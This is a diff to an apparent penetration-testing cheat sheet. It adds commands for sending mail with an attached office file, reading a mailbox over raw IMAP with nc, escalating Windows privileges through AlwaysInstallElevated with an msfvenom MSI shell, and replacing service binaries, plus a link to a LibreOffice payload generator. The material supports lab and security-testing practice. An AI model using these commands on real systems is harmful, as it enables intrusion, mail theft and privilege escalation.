@@ -56,6 +56,19 @@ Victim machine must be configured to send a shell to the attacker on this port
 	https://www.revshells.com/
 .  
 
+## SMTP/POP/IMAP
+	sudo swaks -t mailadmin@localhost --from jonas@localhost --attach @file.ods --server <SMTP IP> --body "Hello" --header "Subject: Subject"
+Send mail through SMTP  
+
+	nc <IMAP IP> 143
+	a1 LOGIN "USERNAME" "PASSWORD"
+	a1 LIST "" *
+	a1 STATUS INBOX (MESSAGES UNSEEN RECENT)
+	a1 SELECT INBOX
+	a1 FETCH 1:* RFC822
+See [hacktricks](https://hacktricks.wiki/en/network-services-pentesting/pentesting-imap.html) for more commands.  
+
+
 ## Webservers
 ### Webscan
 	sudo nmap -sV --script http-enum -p 80,443 123.123.123.123
@@ -387,6 +400,8 @@ List all services and binary paths, omit svchost
 
 For most replaced services, they cannot be started due to lack of privileges, so initiate `shutdown /r /t 0`  
 
+If service binary cannot be replaced directly, try `move service.exe ../service.exe.bak` first.  
+
 ## Windows - open ports
 	netstat -ano
 
@@ -396,6 +411,10 @@ List startup programs
 
 	reg query "HKLM\software\microsoft\windows\currentversion\runonce" /s
 List one-time startup programs  
+
+	reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+	reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+Find AlwaysInstallElevated = 0x1. If so, `msfvenom -f msi` and `msiexec /quiet /qn /i shell.msi`
 
 ## Windows - permissions
 	icacls filename.ext
@@ -880,3 +899,6 @@ cleanup
 
 ## JuicyPotato 32 bit
 For old [machines](https://github.com/ivanitlearning/Juicy-Potato-x86)  
+
+## LibreOffice/OpenOffice payloads
+https://github.com/0bfxgh0st/MMG-LO  
